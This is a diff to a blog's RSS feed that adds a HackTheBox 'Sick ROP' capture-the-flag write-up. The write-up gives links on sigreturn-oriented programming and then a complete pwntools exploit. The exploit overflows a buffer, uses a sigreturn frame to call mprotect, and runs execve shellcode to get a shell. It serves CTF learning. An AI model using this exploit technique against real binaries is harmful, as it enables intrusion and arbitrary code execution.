@@ -5,7 +5,129 @@
     <link>/tags/pwn/</link>
     <description>Recent content in pwn on 0xlilith</description>
     <generator>Hugo -- gohugo.io</generator>
-    <lastBuildDate>Mon, 05 Dec 2022 00:00:00 +0000</lastBuildDate><atom:link href="/tags/pwn/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Fri, 16 Dec 2022 00:00:00 +0000</lastBuildDate><atom:link href="/tags/pwn/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>HTB Sick ROP Writeup</title>
+      <link>/posts/htp-sick-rop/</link>
+      <pubDate>Fri, 16 Dec 2022 00:00:00 +0000</pubDate>
+      
+      <guid>/posts/htp-sick-rop/</guid>
+      <description>ROP chain through Sigreturn - a very different ROP approach that I learned today</description>
+      <content:encoded><![CDATA[<h2 id="about-srop">About SROP</h2>
+<ul>
+<li><a href="https://en.wikipedia.org/wiki/Sigreturn-oriented_programming">Wikipedia</a></li>
+<li><a href="https://guyinatuxedo.github.io/16-srop/index.html">Nightmare by Guyinatuxedo</a></li>
+<li><a href="https://amriunix.com/post/sigreturn-oriented-programming-srop/">Amriunix Blog</a></li>
+</ul>
+<h2 id="exploit">Exploit</h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s2">&#34;amd64&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">e</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./sick_rop&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./sick_rop&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">syscall</span>  <span class="o">=</span> <span class="mh">0x401014</span>
+</span></span><span class="line"><span class="cl"><span class="n">vulnFun</span>  <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x40102e</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">vulnPtr</span>  <span class="o">=</span> <span class="mh">0x4010d8</span>
+</span></span><span class="line"><span class="cl"><span class="n">virtual</span>  <span class="o">=</span> <span class="mh">0x400000</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">overflow</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="mi">40</span>
+</span></span><span class="line"><span class="cl"><span class="n">getShell</span> <span class="o">=</span> <span class="s2">&#34;&#34;&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s2">push   0x42
+</span></span></span><span class="line"><span class="cl"><span class="s2">pop    rax
+</span></span></span><span class="line"><span class="cl"><span class="s2">inc    ah
+</span></span></span><span class="line"><span class="cl"><span class="s2">cqo
+</span></span></span><span class="line"><span class="cl"><span class="s2">push   rdx
+</span></span></span><span class="line"><span class="cl"><span class="s2">movabs rdi, 0x68732f2f6e69622f
+</span></span></span><span class="line"><span class="cl"><span class="s2">push   rdi
+</span></span></span><span class="line"><span class="cl"><span class="s2">push   rsp
+</span></span></span><span class="line"><span class="cl"><span class="s2">pop    rsi
+</span></span></span><span class="line"><span class="cl"><span class="s2">mov    r8, rdx
+</span></span></span><span class="line"><span class="cl"><span class="s2">mov    r10, rdx
+</span></span></span><span class="line"><span class="cl"><span class="s2">syscall
+</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">shell</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">getShell</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">frame</span> <span class="o">=</span> <span class="n">SigreturnFrame</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">frame</span><span class="o">.</span><span class="n">rax</span> <span class="o">=</span> <span class="mi">10</span>      <span class="c1"># sys_mprotect</span>
+</span></span><span class="line"><span class="cl"><span class="n">frame</span><span class="o">.</span><span class="n">rdi</span> <span class="o">=</span> <span class="n">virtual</span> <span class="c1"># Virtual Mem Segment</span>
+</span></span><span class="line"><span class="cl"><span class="n">frame</span><span class="o">.</span><span class="n">rsi</span> <span class="o">=</span> <span class="mh">0x4000</span>  <span class="c1"># Size</span>
+</span></span><span class="line"><span class="cl"><span class="n">frame</span><span class="o">.</span><span class="n">rdx</span> <span class="o">=</span> <span class="mi">7</span>       <span class="c1"># set rwx perm</span>
+</span></span><span class="line"><span class="cl"><span class="n">frame</span><span class="o">.</span><span class="n">rsp</span> <span class="o">=</span> <span class="n">vulnPtr</span> <span class="c1"># pointer to vuln func</span>
+</span></span><span class="line"><span class="cl"><span class="n">frame</span><span class="o">.</span><span class="n">rip</span> <span class="o">=</span> <span class="n">syscall</span> <span class="c1"># syscall addr</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span>  <span class="n">overflow</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">e</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;vuln&#39;</span><span class="p">])</span> 
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">syscall</span><span class="p">)</span> <span class="o">+</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">frame</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="mi">15</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">overflow</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">vulnPtr</span><span class="o">+</span><span class="mi">16</span><span class="p">)</span> <span class="o">+</span> <span class="n">shell</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img loading="lazy" src="/images/sick-rop/shell.png" type="" alt=""  /></p>
+]]></content:encoded>
+    </item>
+    
     <item>
       <title>HTB Hunting Writeup</title>
       <link>/posts/htb-hunting-writeup/</link>
